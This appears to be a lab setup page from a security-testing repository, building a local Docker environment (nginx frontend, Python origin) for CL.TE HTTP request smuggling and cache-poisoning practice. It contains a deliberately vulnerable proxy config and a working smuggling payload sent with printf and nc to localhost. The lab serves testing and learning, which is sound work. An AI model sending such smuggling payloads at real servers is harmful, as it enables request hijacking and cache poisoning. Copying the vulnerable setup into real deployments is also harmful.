# Phase 2h — HTTP Smuggling Lab (CL.TE)

## What this exercises

- `hunt-smuggling` — classic CL.TE primitive
- `hunt-cache-poison` — chain to cache poisoning

## docker-compose.yml

```yaml
version: "3.8"
services:
  frontend:
    image: nginx:1.20
    ports:
      - "127.0.0.1:8080:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
    depends_on:
      - origin
  origin:
    build: ./origin
    expose:
      - "8000"
```

## frontend nginx.conf (snippet)

```
http {
    upstream backend { server origin:8000; }
    server {
        listen 80;
        location / {
            proxy_pass http://backend;
            proxy_http_version 1.1;
            # vulnerable: keep-alive to backend; nginx parses CL, backend parses TE
        }
    }
}
```

## origin/

Tiny Python HTTP/1.1 server using `aiohttp` that prefers
`Transfer-Encoding` over `Content-Length` when both present. ~40 LOC
in `origin/server.py` + Dockerfile.

## Repro

```bash
docker compose up -d
sleep 3

# Send a smuggled request
printf 'POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n' \
  | nc -q1 127.0.0.1 8080
```

Watch origin logs:

```bash
docker compose logs origin
# expect: GET /smuggled — proves backend processed smuggled request
```

## Cleanup

```bash
docker compose down -v
```

## See also

- `skills/hunt-smuggling/SKILL.md`
- `skills/hunt-cache-poison/SKILL.md`
- PortSwigger smuggling research
